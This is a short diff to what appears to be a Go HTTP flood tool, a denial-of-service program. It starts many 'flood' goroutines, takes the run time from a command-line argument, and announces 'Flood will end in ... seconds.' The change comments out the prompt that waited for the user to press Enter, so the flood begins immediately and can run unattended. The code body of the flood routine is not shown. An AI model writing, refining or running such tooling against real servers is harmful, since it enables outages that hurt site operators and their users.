@@ -265,7 +265,7 @@ func main() {
 	} else {
 		page = "&"
 	}
-	input := bufio.NewReader(os.Stdin)
+	// input := bufio.NewReader(os.Stdin)
 	for i := 1; i <= threads; i++ {
 		time.Sleep(time.Millisecond * 10)
 		go flood() // Start threads
@@ -273,12 +273,12 @@ func main() {
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
-	fmt.Printf("\nPlease [Enter] for continue")
-	_, err := input.ReadString('\n')
-	if err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
+	// fmt.Printf("\nPlease [Enter] for continue")
+	// _, err := input.ReadString('\n')
+	// if err != nil {
+	// 	fmt.Println(err)
+	//	os.Exit(1)
+	// }
 	fmt.Println("Flood will end in " + os.Args[6] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
